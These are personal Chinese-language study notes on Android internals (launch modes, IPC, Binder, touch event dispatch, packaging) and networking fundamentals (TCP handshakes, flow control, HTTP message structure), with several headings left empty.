如果和singleTask模式一起出现，若被启动的Activity已经存在栈中，则清除其之上的Activity，并调用该Activity的onNewIntent方法。

如果被启动的Activity采用standard模式，那么该Activity连同之上的所有Activity出栈，然后创建新的Activity实例并压入栈中。

- ActivityAtackSuperVisor startActivityUncheckedLocked 中做启动模式的检验处理。

- Context的startActivity中做NewTask的检验

  ```java
  public void startActivity(Intent intent, Bundle options) {
      warnIfCallingFromSystemProcess();
      if((intent.getFlags() & Intent.FLAG_ACTIVITY_NEW_TASK) == 0) {
          thrownew AndroidRuntimeException(
                  "Calling startActivity() from outside of an Activity "
                          +" context requires the FLAG_ACTIVITY_NEW_TASK flag."
                          +" Is this really what you want?");
      }
      mMainThread.getInstrumentation().execStartActivity(
              getOuterContext(), mMainThread.getApplicationThread(), null,
              (Activity)null, intent, -1, options);
  }
  ```

Intent的优先级要高于Mainfest；Mainfest无法指定cleartop，Intent无法实现SingleInstance





显示调用优先级大于隐式调用

IntentFilter中过滤信息有cation，category，data，需要三者同时匹配。

一个Activity可以有多个IntentFilter，但是满足一个就可以调起。

catagory 需要全部匹配，默认Default，还有Launcher。**要想可以隐式启动，必要要有Default的Catagory**

data 数据类型  setDataAndType,不能setData再setType



### IPC 方式及原理

多进程的问题：

- 静态成员和单例无效
- 线程同步机制无效
- Sp可靠性下降
- Application多次创建



同一应用下多进程相当于开启了sharedUid。

SharedUid和签名相同才可以共享数据



IPC方式：

- Bundle

Bundle 实现了Parcelable 接口。

- 文件共享

并发不高的情况下

- Messager

底层其实是AIDL

Messenger messenger = new Messenger(Handler); 服务端构造handler处理消息,将messenger.getBinder 返回给客户端。handler中的message可以使用message.replayTo 获取外面的messenger，并send发送消息给客户端

Messenger messenger = new Messenger(Binder); 获取服务端返回的Binder，并填充Bundle消息调用messenger.send 发送消息 

- AIDL

  支持类型：基本，string，list、map，parcelable（需要新建同名aidl，声明parcelable book

  AIDL中只能使用AIDL文件的接口

  - 客户端传递一个对象到服务端，传到服务端其实是一个新的对象，底层是**序列化与反序列化过程**。

    因此在注册到服务端可以，但是解注册服务端就有些区别。需要用到RemoteCallBackList，以Binder为key；

    RemoteCallBackList.rsgister(xxinterface)

    RemoteCallBackList.unregister(xxinterface);

    ​

    RemoteCallBackList.beginBroadcast();

    for(,,) {

    ​	RemoteCallBackList.getBroadCastItem(i);

    }

    RemoteCallBackList.finishBroadcast();

  - 服务端如果是耗时操作，客户端会阻塞；服务端本身是运行在服务端的binder线程池的，所以没有关系啊，客户端需要开启线程。

  - 监听binder意外死亡

    一种是onServiceDisconnected中重新连接，运行在主ui线程

    一种是注册DeathRecipient，回调在客户端的binder线程中

    客户端拿到Binder后，

    Ibinder.DeathRecipient  = new IBinder,DeathRecipient () {

    ​	重写binderDied（）   

    }

    ​

- ContentProvider

  运行在ContentProvider所在进程；

  onCreate运行在该远程app的ui线程，query ，update，insert，delete ，getType运行在binder线程池中。

  增删改查是存在多线程并发访问的，需要做好线程同步。

  URI uri = URI.parse(content：//com.test.....)

  getContentResolver().query().

  <Provider

  ​	android,name="";

  ​	android:authority="com.test..."

  ​	android:permission=",,,"//外部需要引入该权限，才可以访问该provider

- Socket

  socket是对TCP/IP协议的封装，Socket本身并不是协议，而是一个调用接口（API），通过Socket，我们才能使用TCP/IP协议。介于应用层和传输层之间

  ServerSocket = new Socket(8089);

  Socket = new Socket(8089)

  客户端

  socket.getInputStream 读取数据

  socet.getOutPutStream 发送数据

  服务端

  客户端socket = serverSocket.accept

  socket.getInputStream 读取数据

  socet.getOutPutStream 发送数据

Binder 连接池

服务端维护一个poolbinder，可以根据code返回相应的远程服务端binder实例

客户端连接到服务端service后，得到一个poolbinder，可以调用poolbinder.queryBinder得到对应的binder。







###Binder机制

http://blog.csdn.net/happylishang/article/details/62234127



addService

1.添加到ServiceManager.srcList,

2.将binder_ref节点拷贝到ServiceManager中红黑树



getService

1.判断ServiceManager中srcList是否存在

2.将serviceManager 中的binder_ref节点拷贝到用户本地的红黑树





**一次拷贝：**

- Binder的map函数，会将内核空间直接与用户空间对应，用户空间可以直接访问内核空间的数据
- A进程的数据会被直接拷贝到B进程的内核空间（一次拷贝）
- **当数据从用户空间拷贝到内核空间的时候，是直从当前进程的用户空间接拷贝到目标进程的内核空间，这个过程是在请求端线程中处理的，操作对象是目标进程的内核空间**





限制大小：

普通的由Zygote孵化而来的用户进程，所映射的Binder内存大小是不到1M的，准确说是 1*1024*1024) - (4096 *2) ：这个限制定义在ProcessState类中，如果传输说句超过这个大小，系统就会报错，



相关问题：

http://blog.csdn.net/happylishang/article/details/51784834

- 什么是binder

1. 直观来说，Binder是Android中的一个类，它继承了IBinder接口 
2. 从IPC角度来说，Binder是Android中的一种跨进程通信方式，Binder还可以理解为一种虚拟的物理设备，它的设备驱动是/dev/binder，该通信方式在linux中没有 
3. 从Android Framework角度来说，Binder是ServiceManager连接各种Manager（ActivityManager、WindowManager，etc）和相应ManagerService的桥梁 
4. 从Android应用层来说，Binder是客户端和服务端进行通信的媒介，当你bindService的时候，服务端会返回一个包含了服务端业务调用的Binder对象，通过这个Binder对象，客户端就可以获取服务端提供的服务或者数据，这里的服务包括普通服务和基于AIDL的服务

- 为什么要使用Binder？

  主要有两个方面的原因：

  - 性能方面 

    在移动设备上（性能受限制的设备，比如要省电），广泛地使用跨进程通信对通信机制的性能有严格的要求，Binder相对出传统的Socket方式，更加高效。Binder数据拷贝只需要一次，而管道、消息队列、Socket都需要2次，共享内存方式一次内存拷贝都不需要，但实现方式又比较复杂。

  - 安全方面 

    传统的进程通信方式对于通信双方的身份并没有做出严格的验证，比如Socket通信ip地址是客户端手动填入，很容易进行伪造，而Binder机制从协议本身就支持对通信双方做身份校检，因而大大提升了安全性。

    用户空间无法访问的内存空间来交换数据

  - 还有一些好处，如实现面象对象的调用方式，在使用Binder时就和调用一个本地实例一样。

- Binder的线程管理 

  每个Binder的Server进程会创建很多线程来处理Binder请求，可以简单的理解为创建了一个Binder的线程池吧（虽然实际上并不完全是这样简单的线程管理方式），而真正管理这些线程并不是由这个Server端来管理的，而是由Binder驱动进行管理的。 
  一个进程的Binder线程数默认最大是16，超过的请求会被阻塞等待空闲的Binder线程。。

- binder 运行机制

  基于CS模式

  client，Server，ServiceManager（类似于域名服务器），Binder驱动

  ![java_binder](http://gityuan.com/images/binder/java_binder/java_binder.jpg)

### ServiceManager存在的原因和意义

(01) 对于Binder驱动而言，ServiceManager是一个守护进程，更是Android系统各个服务的管理者。Android系统中的各个服务，都是添加到ServiceManager中进行管理的，而且每个服务都对应一个服务名。当Client获取某个服务时，则通过服务名来从ServiceManager中获取相应的服务。



### view的点击事件

![ViewGroup事件分发流程](http://img.blog.csdn.net/20160908175817900)



- 如果不被拦截，遍历寻找可以处理的子view
- 如果没有可以处理的子view，自身ontouchevent处理
- 如果有可以处理的子view
  - 先查看是否已经被处理，即是否相当，如果相当，直接return结果
  - 如果没有处理，则查看是否被拦截·如果被拦截，则修改事件为cancle，后续子view不再接受该事件
- 在ActionDown时如果拦截，那么firsttarget肯定为空，因为没有子view处理，后续则直接拦截。后续子view都收不到事件



requestDisallowInterceptTouchEvent   会让viewgroup对于事件都不拦截，但是对于Actiondown无效，因为Actiondown会重置该标志位





- disallowIntercept?
   **disallowIntercept的作用**
   ViewGroup有一个disallowIntercept开关，可以设置此ViewGroup是否屏蔽onInterceptTouchEvent事件。如果开启此开关，则此ViewGroup跳过自身的onInterceptTouchEvent事件，直接dispatchTouchEvent到子View。
   **重置disallowIntercept**
   disallowIntercept，会在每次ACTION_DOWN被重置，默认为允许调用onInterceptTouchEvent。

```
//ViewGroup.dispatchTouchEvent
@Override
public boolean dispatchTouchEvent(MotionEvent ev) {
    ...
    boolean handled = false;
    if (onFilterTouchEventForSecurity(ev)) {
        final int action = ev.getAction();
        final int actionMasked = action & MotionEvent.ACTION_MASK;

        // Handle an initial down.
        if (actionMasked == MotionEvent.ACTION_DOWN) {
            // Throw away all previous state when starting a new touch gesture.
            // The framework may have dropped the up or cancel event for the previous gesture
            // due to an app switch, ANR, or some other state change.
            cancelAndClearTouchTargets(ev);
            resetTouchState();
        }
        ...
    }
    ...
}
/**
 * 
 * Resets all touch state in preparation for a new cycle.
 */
//ViewGroup.resetTouchState
private void resetTouchState() {
    clearTouchTargets();
    resetCancelNextUpFlag(this);
    mGroupFlags &= ~FLAG_DISALLOW_INTERCEPT;
    mNestedScrollAxes = SCROLL_AXIS_NONE;
}
```



dispatchTouchEvent return true 意味着要么自己处理了，要么子view处理了，所以后续事件也会接收到

onTouchEvent return true  表明当前view处理了事件，就是说子view没有成功处理事件，firstTouchTarget为null，则后续事件直接交给当前onTouchEvent 来来处理



![未命名文件 (3)](C:\Users\nj\Downloads\未命名文件 (3).png)





onTouchListener ->onTouchevent ->onClickListener



view的DispatchTouchEvent 的enable问题**

1. 当View是不可用的时候，通过setOnTouchListener设置的OnTouchListener中的onTouch方法将不会执行。
2. 当View是不可用的时候，onTouchEvent会被执行，但不会执行实质的逻辑，比如onClick、onLongClick等方法不会被执行到。此时onTouchEvent的返回值由该View能不能点击（包括长按和短按等点击状态）来决定。可以点击时返回true,否则返回false。
3. 当View是不可点击的时候，除非调用过View的setTouchDelegate方法传入 mTouchDelegate，否则onTouchEvent必定会返回false，具体的逻辑，例如onClick、onLongClick等不会被调用。



view 不可用 ，不执行onTouch，执行onTouchEvent，返回是否可以点击，不执行onClick

view 可用时，在onTouchEvent中会去判断是否可以点击，如果可以，执行onClick，不可点击，直接不调用onClick

###View的绘制  



### 四大组件原理



**BroadCastReceiver**

无序广播，有序广播，粘性广播 

从Android 3.1开始，给Intent定义了两个新的Flag，分别为FLAG_INCLUDE_STOPPED_PACKAGES和FLAG_EXCLUDE_STOPPED_PACKAGES，用来控制Intent是否要对处于停止状态的App起作用，顾名思义：

FLAG_INCLUDE_STOPPED_PACKAGES：表示包含未启动的App

FLAG_EXCLUDE_STOPPED_PACKAGES：表示不包含未启动的App

![图1](https://www.2cto.com/uploadfile/Collfiles/20160720/20160720090857793.png)



## Android 安装过程

1.拷贝Apk文件到指定目录

2.解压apk，拷贝文件，创建数据目录

3.解析apk的Mainfest文件

4.dexopt

5.权限

6.显示快捷方式



## Android 签名原理

生成摘要mf -> sha1 编码  sf - > RSA 加密 rsa

### **Android 打包流程：**

![img](https://upload-images.jianshu.io/upload_images/1441907-8a2c24bbb71c2cbf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/536)

- aapt 打包资源，生成R.java 以及resource.arsc文件
- 处理AIDL文件，生成相应的java文件
- 编译工程源代码，生成class文件
- 转换class文件，生成class.dex文件
- 打包生成apk
- 对apk进行签名







## Android动画总结

传统动画：

帧动画：多张图片顺序显示

补间动画：淡入淡出，位移，旋转，缩放

属性动画：

差值器：interPolator，默认有匀速linearInterpolator，加速，减速等



### WindowManager

###Context

### 消息机制

### 图片加载

### NDK

###崩溃



## 数据结构

###线性表

如何判断两个链表是否有交点

### 树

二叉树 ->二叉查找/搜索树 ->二叉平衡树（左右子树高度差不大于1）->红黑树

###栈和堆

###大数据处理



## 网络

###TCP/IP协议

![img](https://camo.githubusercontent.com/d09fc0a3f31a4c591019babc45d3a86d57b6e1d1/687474703a2f2f75706c6f61642d696d616765732e6a69616e7368752e696f2f75706c6f61645f696d616765732f333938353536332d306363326564656639356137313636392e706e673f696d6167654d6f6772322f6175746f2d6f7269656e742f7374726970253743696d61676556696577322f322f772f31323430)



![img](https://camo.githubusercontent.com/c7d6abad448bbb8917784a3b33de28ab2bbdb099/687474703a2f2f75706c6f61642d696d616765732e6a69616e7368752e696f2f75706c6f61645f696d616765732f333938353536332d386138373666346430333161656163662e706e673f696d6167654d6f6772322f6175746f2d6f7269656e742f7374726970253743696d61676556696577322f322f772f31323430)

**ip层：**

IP不是可靠的协议，这是说，IP协议没有提供一种数据未传达以后的处理机制，这被认为是上层协议——TCP或UDP要做的事情。

arp协议：

寻址，发送mac地址，返回响应

ICMP 网络控制报文协议

IP协议并不是一个可靠的协议，它不保证数据被送达，那么，自然的，保证数据送达的工作应该由其他的模块来完成。其中一个重要的模块就是ICMP(网络控制报文)协议。ICMP不是高层协议，而是IP层的协议。

当传送IP数据包发生错误。比如主机不可达，路由不可达等等，ICMP协议将会把错误信息封包，然后传送回给主机。给主机一个处理错误的机会，这 也就是为什么说建立在IP层以上的协议是可能做到安全的原因。

ping就是ICMP的一个应用·

Traceroute

Traceroute是用来侦测主机到目的主机之间所经路由情况的重要工具，也是最便利的工具。

Traceroute的原理非常非常有意思。它收到到目的主机的IP后，首先给目的主机发送一个TTL=1（Time To Live）的UDP数据包，而经过的第一个路由器收到这个数据包以后，就自动把TTL减1，而TTL变为0以后，路由器就把这个包给抛弃了，并同时产生一个主机不可达的ICMP数据报给主机。主机收到这个数据报以后再发一个TTL=2的UDP数据报给目的主机，然后刺激第二个路由器给主机发ICMP数据报。如此往复直到到达目的主机。这样，traceroute就拿到了所有的路由器IP。



**TCP/UDP**

- 连接性：

  链接与非链接


- ##### 面向报文

  面向报文的传输方式是应用层交给UDP多长的报文，UDP发送多长的报文，即一次发送一个报文。因此，应用程序必须选择合适大小的报文。若报文太长，则IP层需要分片，降低效率；若太短，会使IP数据报太小。

  ##### 面向字节流

  面向字节流的话，虽然应用程序和TCP的交互是一次一个数据块（大小不等），但TCP把应用程序看成是一连串的无结构的字节流。TCP有一个缓冲，当应用程序传送的数据块太长，TCP就可以把它划分短一些再传送。

**DNS**

DNS（Domain Name System，域名系统），因特网上作为域名和IP地址相互映射的一个分布式数据库，能够使用户更方便的访问互联网，而不用去记住能够被机器直接读取的IP数串。通过主机名（域名），最终得到该主机名对应的IP地址的过程叫做域名解析（或主机名解析）。DNS协议运行在UDP协议之上，使用端口号53。



**TCP 三次握手与四次挥手**

**三次握手**

TCP是面向连接的，无论哪一方向另一方发送数据之前，都必须先在双方之间建立一条连接。在TCP/IP协议中，TCP协议提供可靠的连接服务，连接是通过三次握手进行初始化的。三次握手的目的是同步连接双方的序列号和确认号并交换 TCP窗口大小信息。

![img](http://blog.chinaunix.net/attachment/201304/8/22312037_1365405910EROI.png)

报文信息：

![img](http://blog.chinaunix.net/attachment/201304/7/22312037_1365321234nnNc.png)

（1）序号：Seq序号，占32位，用来标识从TCP源端向目的端发送的字节流，发起方发送数据时对此进行标记。

（2）确认序号：Ack序号，占32位，只有ACK标志位为1时，确认序号字段才有效，Ack=Seq+1。

（3）标志位：共6个，即URG、ACK、PSH、RST、SYN、FIN等，具体含义如下：
​                （A）URG：紧急指针（urgent pointer）有效。
​                **（B）ACK：确认序号有效。**
​                （C）PSH：接收方应该尽快将这个报文交给应用层。
​                （D）RST：重置连接。
​                **（E）SYN：发起一个新连接。**
​                **（F）FIN：释放一个连接。**

确认方Ack=发起方Req+1，两端配对

解析：

客户端：准备建立连接，发送SYN  = 1，并生成一个seq序号；

服务端：收到请连接后同意建立连接，

​	回送SYN = 1，表示也要请求与客户端建立连接；并发送一个seq序列号；

​	回送ACK 标志位 = 1，并使ack = seq + 1，表示服务端收到的请求链接不是虚构的，同时发送一个新的seq

客户端：

​	收到服务端的ack后表示客户端发起的单向连接已建立，还需要处理服务端发起的连接；

​	回应服务端表示收到连接，ACK = 1，ack = 服务端的seq + 1；



SYN攻击

 在三次握手过程中，Server发送SYN-ACK之后，收到Client的ACK之前的TCP连接称为半连接（half-open connect），此时Server处于SYN_RCVD状态，当收到ACK后，Server转入ESTABLISHED状态。SYN攻击就是Client在短时间内伪造大量不存在的IP地址，并向Server不断地发送SYN包，Server回复确认包，并等待Client的确认，由于源地址是不存在的，因此，Server需要不断重发直至超时，这些伪造的SYN包将产时间占用未连接队列，导致正常的SYN请求因为队列满而被丢弃，从而引起网络堵塞甚至系统瘫痪。SYN攻击时一种典型的DDOS攻击，检测SYN攻击的方式非常简单，即当Server上有大量半连接状态且源IP地址是随机的，则可以断定遭到SYN攻击了，使用如下命令可以让之现行：

**四次挥手：**

![img](https://upload-images.jianshu.io/upload_images/1641067-5ed8bf6c24244b4c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700)



解析：

第一次挥手： 客户端发送FIN 表示要关闭连接，并发送一个seq序列号,客户端进入FIN_WAIT 状态，即主动关闭状态，不会再发送新的数据（是指新的数据，关闭的报文不算）。

第二次挥手： 服务端收到关闭请求后，需要立即回应，ACK = 1.ack = seq +1;并发送一个新的序列号seq。

第三次挥手： 服务端再发送完所有的数据后，开始发起关闭请求。FIN = 1，ACK =1，ack = u+1，并再发送一个新的seq

第四次挥手：客户端收到断开后，回应ACK，ack = 最后一次序列号+1，并发送seq+1；

**为什么连接的时候是三次握手，关闭的时候却是四次握手？**

因为当Server端收到Client端的SYN连接请求报文后，可以直接发送SYN+ACK报文。其中ACK报文是用来应答的，SYN报文是用来同步的。但是关闭连接时，当Server端收到FIN报文时，很可能并不会立即关闭SOCKET，所以只能先回复一个ACK报文，告诉Client端，"你发的FIN报文我收到了"。只有等到我Server端所有的报文都发送完了，我才能发送FIN报文，因此不能一起发送。故需要四步握手。

**为什么TIME_WAIT状态需要经过2MSL(最大报文段生存时间)才能返回到CLOSE状态？**

- MSL：报文段最大生存时间，它是任何报文段被丢弃前在网络内的最长时间。
  原因有二：

  - 保证TCP协议的全双工连接能够可靠关闭
  - 保证这次连接的重复数据段从网络中消失

  第一点：如果主机1直接CLOSED了，那么由于IP协议的不可靠性或者是其它网络原因，导致主机2没有收到主机1最后回复的ACK。那么主机2就会在超时之后继续发送FIN，此时由于主机1已经CLOSED了，就找不到与重发的FIN对应的连接。所以，主机1不是直接进入CLOSED，而是要保持TIME_WAIT状态。当再次收到FIN的时候，能够保证对方收到ACK，最后正确的关闭连接。

  第二点：如果主机1直接CLOSED，然后又再向主机2发起一个新连接，我们不能保证这个新连接与刚关闭的连接的端口号是不同的。也就是说有可能新连接和老连接的端口号是相同的。一般来说不会发生什么问题，但是还是有特殊情况出现：假设新连接和已经关闭的老连接端口号是一样的，**如果前一次连接的某些数据仍然滞留在网络中**（称为Lost Duplicate），这些延迟数据在建立新连接之后才到达主机2，由于新连接和老连接的端口号是一样的，TCP协议就认为那个延迟的数据是属于新连接的，这样就和真正的新连接的数据包发生混淆了。所以TCP连接要在TIME_WAIT状态等待2倍MSL，保证本次连接的所有数据都从网络中消失。



**TCP 流量控制**

如果发送方把数据发送得过快，接收方可能会来不及接收，这就会造成数据的丢失。所谓**流量控制**就是让发送方的发送速率不要太快，要让接收方来得及接收。

利用**滑动窗口机制**可以很方便地在TCP连接上实现对发送方的流量控制。

设A向B发送数据。在连接建立时，B告诉了A：“我的接收窗口是 rwnd = 400 ”(这里的 rwnd 表示 receiver window) 。因此，发送方的发送窗口不能超过接收方给出的接收窗口的数值。请注意，TCP的窗口单位是字节，不是报文段。假设每一个报文段为100字节长，而数据报文段序号的初始值设为1。**大写ACK表示首部中的确认位ACK，小写ack表示确认字段的值ack。**

[![img](https://camo.githubusercontent.com/c0a0c2894760d9b6b42f58828a66fe08e4f3103c/687474703a2f2f75706c6f61642d696d616765732e6a69616e7368752e696f2f75706c6f61645f696d616765732f333938353536332d383436323330623262393165353639362e706e673f696d6167654d6f6772322f6175746f2d6f7269656e742f7374726970253743696d61676556696577322f322f772f31323430)](https://camo.githubusercontent.com/c0a0c2894760d9b6b42f58828a66fe08e4f3103c/687474703a2f2f75706c6f61642d696d616765732e6a69616e7368752e696f2f75706c6f61645f696d616765732f333938353536332d383436323330623262393165353639362e706e673f696d6167654d6f6772322f6175746f2d6f7269656e742f7374726970253743696d61676556696577322f322f772f31323430)

从图中可以看出，B进行了三次流量控制。第一次把窗口减少到 rwnd = 300 ，第二次又减到了 rwnd = 100 ，最后减到 rwnd = 0 ，即不允许发送方再发送数据了。这种使发送方暂停发送的状态将持续到主机B重新发出一个新的窗口值为止。B向A发送的三个报文段都设置了 ACK = 1 ，只有在ACK=1时确认号字段才有意义。

TCP为每一个连接设有一个持续计时器(persistence timer)。当TCP连接中的发送方收到接收方的零窗口通知时，发送方就启动持续计时器。若持续计时器设置的时间到期，发送方就发送一个零窗口控测报文段（携1字节的数据）给接收方。如果接收方可以接收数据，就重新开始发送数据；如果接收方不能接收数据，就重新设置持续计时器。

**TCP拥塞控制**

慢开始：慢慢加倍

拥塞避免：慢慢加1

##### 快重传：**快重传算法还规定，发送方只要一连收到三个重复确认就应当立即重传对方尚未收到的报文段M3，而不必 继续等待M3设置的重传计时器到期。**

##### 快恢复：





**Http：**

![img](https://camo.githubusercontent.com/e279f8767b0ce9a63fa4c2f59a3d807a834fb19b/687474703a2f2f75706c6f61642d696d616765732e6a69616e7368752e696f2f75706c6f61645f696d616765732f333938353536332d656634336266613834626236386465312e706e673f696d6167654d6f6772322f6175746f2d6f7269656e742f7374726970253743696d61676556696577322f322f772f31323430)

HTTP协议就是基于TCP/IP协议模型来传输信息的。

![img](https://camo.githubusercontent.com/08a0b702f978fa784e5e0f8e26e850535b351c4f/687474703a2f2f75706c6f61642d696d616765732e6a69616e7368752e696f2f75706c6f61645f696d616765732f333938353536332d653533336230636464376663613335392e706e673f696d6167654d6f6772322f6175746f2d6f7269656e742f7374726970253743696d61676556696577322f322f772f31323430)

  TCP是底层通讯协议，定义的是数据传输和连接方式的规范
  HTTP是应用层协议，定义的是传输数据的内容的规范



### Http与Https  1.0和2.0

**四个基于：**

**请求与响应：** 客户端发送请求，服务器端响应数据

**无状态的：** 协议对于事务处理没有记忆能力，客户端第一次与服务器建立连接发送请求时需要进行一系列的安全认证匹配等，因此增加页面等待时间，当客户端向服务器端发送请求，服务器端响应完毕后，两者断开连接，也不保存连接状态，一刀两断！恩断义绝！从此路人！下一次客户端向同样的服务器发送请求时，由于他们之前已经遗忘了彼此，所以需要重新建立连接。

**应用层：** Http是属于应用层的协议，配合TCP/IP使用。

**TCP/IP：** Http使用TCP作为它的支撑运输协议。HTTP客户机发起一个与服务器的TCP连接，一旦连接建立，浏览器（客户机）和服务器进程就可以通过套接字接口访问TCP。



**http 请求报文**

一个HTTP请求报文由请求行（request line）、请求头部（header）、空行和请求数据4个部分组成，下图给出了请求报文的一般格式。

[![img](https://camo.githubusercontent.com/507aa6f35ae701d26e0c4ceea9d3aa8db768148a/687474703a2f2f75706c6f61642d696d616765732e6a69616e7368752e696f2f75706c6f61645f696d616765732f333938353536332d636435396133383939656635343665312e706e673f696d6167654d6f6772322f6175746f2d6f7269656e742f7374726970253743696d61676556696577322f322f772f31323430)](https://camo.githubusercontent.com/507aa6f35ae701d26e0c4ceea9d3aa8db768148a/687474703a2f2f75706c6f61642d696d616765732e6a69616e7368752e696f2f75706c6f61645f696d616765732f333938353536332d636435396133383939656635343665312e706e673f696d6167654d6f6772322f6175746f2d6f7269656e742f7374726970253743696d61676556696577322f322f772f31323430)

##### 1.请求行

请求行分为三个部分：请求方法、请求地址和协议版本

**请求方法**

HTTP/1.1 定义的请求方法有8种：GET、POST、PUT、DELETE、PATCH、HEAD、OPTIONS、TRACE。

最常的两种GET和POST，如果是RESTful接口的话一般会用到GET、POST、DELETE、PUT。

**请求地址**

URL：统一资源定位符，是一种自愿位置的抽象唯一识别方法。

组成：<协议>：//<主机>：<端口>/<路径>

**端口和路径有时可以省略（HTTP默认端口号是80）**

如下例：

[![img](https://camo.githubusercontent.com/024f9f2d3265badae21fd170fc021886eca0c87c/687474703a2f2f75706c6f61642d696d616765732e6a69616e7368752e696f2f75706c6f61645f696d616765732f333938353536332d353463653565636130343832353362652e706e673f696d6167654d6f6772322f6175746f2d6f7269656e742f7374726970253743696d61676556696577322f322f772f31323430)](https://camo.githubusercontent.com/024f9f2d3265badae21fd170fc021886eca0c87c/687474703a2f2f75706c6f61642d696d616765732e6a69616e7368752e696f2f75706c6f61645f696d616765732f333938353536332d353463653565636130343832353362652e706e673f696d6167654d6f6772322f6175746f2d6f7269656e742f7374726970253743696d61676556696577322f322f772f31323430)

有时会带参数，GET请求

**协议版本**

协议版本的格式为：HTTP/主版本号.次版本号，常用的有HTTP/1.0和HTTP/1.1

##### 2.请求头部

请求头部为请求报文添加了一些附加信息，由“名/值”对组成，每行一对，名和值之间使用冒号分隔。

常见请求头如下：

[![img](https://camo.githubusercontent.com/234218685a54c4b42180d64a0fe2dd95c43407e2/687474703a2f2f75706c6f61642d696d616765732e6a69616e7368752e696f2f75706c6f61645f696d616765732f333938353536332d353339333738656565313466613332322e706e673f696d6167654d6f6772322f6175746f2d6f7269656e742f7374726970253743696d61676556696577322f322f772f31323430)](https://camo.githubusercontent.com/234218685a54c4b42180d64a0fe2dd95c43407e2/687474703a2f2f75706c6f61642d696d616765732e6a69616e7368752e696f2f75706c6f61645f696d616765732f333938353536332d353339333738656565313466613332322e706e673f696d6167654d6f6772322f6175746f2d6f7269656e742f7374726970253743696d61676556696577322f322f772f31323430)

请求头部的最后会有一个空行，表示请求头部结束，接下来为请求数据，这一行非常重要，必不可少。

##### 3.请求数据

可选部分，比如GET请求就没有请求数据。

下面是一个POST方法的请求报文：

> POST 　/index.php　HTTP/1.1 　　 请求行
> Host: localhost
> User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:10.0.2) Gecko/20100101 Firefox/10.0.2　　请求头
> Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
> Accept-Language: zh-cn,zh;q=0.5
> Accept-Encoding: gzip, deflate
> Connection: keep-alive
> Referer:<http://localhost/>
> Content-Length：25
> Content-Type：application/x-www-form-urlencoded
> 　　空行
> username=aa&password=1234　　请求数据

### 六、HTTP响应报文

[![img](https://camo.githubusercontent.com/a908e02955be9071342f6dd3ec74ba0d5ba3669d/687474703a2f2f75706c6f61642d696d616765732e6a69616e7368752e696f2f75706c6f61645f696d616765732f333938353536332d633665653866383532366635396663302e706e673f696d6167654d6f6772322f6175746f2d6f7269656e742f7374726970253743696d61676556696577322f322f772f31323430)](https://camo.githubusercontent.com/a908e02955be9071342f6dd3ec74ba0d5ba3669d/687474703a2f2f75706c6f61642d696d616765732e6a69616e7368752e696f2f75706c6f61645f696d616765732f333938353536332d633665653866383532366635396663302e706e673f696d6167654d6f6772322f6175746f2d6f7269656e742f7374726970253743696d61676556696577322f322f772f31323430)

HTTP响应报文主要由状态行、响应头部、空行以及响应数据组成。

##### 1.状态行

由3部分组成，分别为：协议版本，状态码，状态码描述。

其中协议版本与请求报文一致，状态码描述是对状态码的简单描述，所以这里就只介绍状态码。

**状态码**

状态代码为3位数字。

- 1xx：指示信息——表示请求已接收，继续处理。
- 2xx：成功——表示请求已被成功接收、理解、接受。
- 3xx：重定向——要完成请求必须进行更进一步的操作。
- 4xx：客户端错误——请求有语法错误或请求无法实现。
- 5xx：服务器端错误——服务器未能实现合法的请求。

302 重定向   304 缓存可用

下面列举几个常见的：

[![img](https://camo.githubusercontent.com/f4a86f02aeb8f6aeb78044236fd93ac22ccd6937/687474703a2f2f75706c6f61642d696d616765732e6a69616e7368752e696f2f75706c6f61645f696d616765732f333938353536332d386633626630353962633433363565332e706e673f696d6167654d6f6772322f6175746f2d6f7269656e742f7374726970253743696d61676556696577322f322f772f31323430)](https://camo.githubusercontent.com/f4a86f02aeb8f6aeb78044236fd93ac22ccd6937/687474703a2f2f75706c6f61642d696d616765732e6a69616e7368752e696f2f75706c6f61645f696d616765732f333938353536332d386633626630353962633433363565332e706e673f696d6167654d6f6772322f6175746f2d6f7269656e742f7374726970253743696d61676556696577322f322f772f31323430)

##### 2.响应头部

与请求头部类似，为响应报文添加了一些附加信息

常见响应头部如下：

[![img](https://camo.githubusercontent.com/da4295c091a27c6643bd3f23382b0187a003ec92/687474703a2f2f75706c6f61642d696d616765732e6a69616e7368752e696f2f75706c6f61645f696d616765732f333938353536332d333365643935343739663534316130372e706e673f696d6167654d6f6772322f6175746f2d6f7269656e742f7374726970253743696d61676556696577322f322f772f31323430)](https://camo.githubusercontent.com/da4295c091a27c6643bd3f23382b0187a003ec92/687474703a2f2f75706c6f61642d696d616765732e6a69616e7368752e696f2f75706c6f61645f696d616765732f333938353536332d333365643935343739663534316130372e706e673f696d6167654d6f6772322f6175746f2d6f7269656e742f7374726970253743696d61676556696577322f322f772f31323430)

##### 3.响应数据

用于存放需要返回给客户端的数据信息。

下面是一个响应报文的实例：

> HTTP/1.1 200 OK　　状态行
> Date: Sun, 17 Mar 2013 08:12:54 GMT　　响应头部
> Server: Apache/2.2.8 (Win32) PHP/5.2.5
> X-Powered-By: PHP/5.2.5
> Set-Cookie: PHPSESSID=c0huq7pdkmm5gg6osoe3mgjmm3; path=/
> Expires: Thu, 19 Nov 1981 08:52:00 GMT
> Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
> Pragma: no-cache
> Content-Length: 4393
> Keep-Alive: timeout=5, max=100
> Connection: Keep-Alive
> Content-Type: text/html; charset=utf-8
> 　　空行
>
> <html>　　响应数据
> <head>
> <title>HTTP响应示例<title>
> </head>
> <body>
> Hello HTTP!
> </body>
> </html>

关于请求头部和响应头部的知识点很多，这里只是简单介绍。

通过以上步骤，数据已经传递完毕，HTTP/1.1会维持持久连接，但持续一段时间总会有关闭连接的时候，这时候据需要断开TCP连接。



header相关字段

request：

| 字段名                  | 意义                             |
| -------------------- | ------------------------------ |
| Cache-Control        | 指定请求和响应遵循的缓存机制                 |
| Date                 | 请求发送时间                         |
| Expect： 100-continue | post前询问服务端是否处理大数据的请求，如果处理再上传数据 |
| if-Modified-since    | 未改变返回304，修改过请求成功               |
| If-None-Match        | 未改变返回304，修改过请求成功               |

max-stale：

1. max-stale, 可以使用过期缓存
2. max-stale=s, 在 s 秒内, 缓存可以过期
3. min-fresh=s, 在 s 秒内, 缓存不能过期
4. max=age=s, 缓存的 age 必须小于 s 秒 
5. no-cache, 除非资源进行再验证, 否则不接受缓存





response：

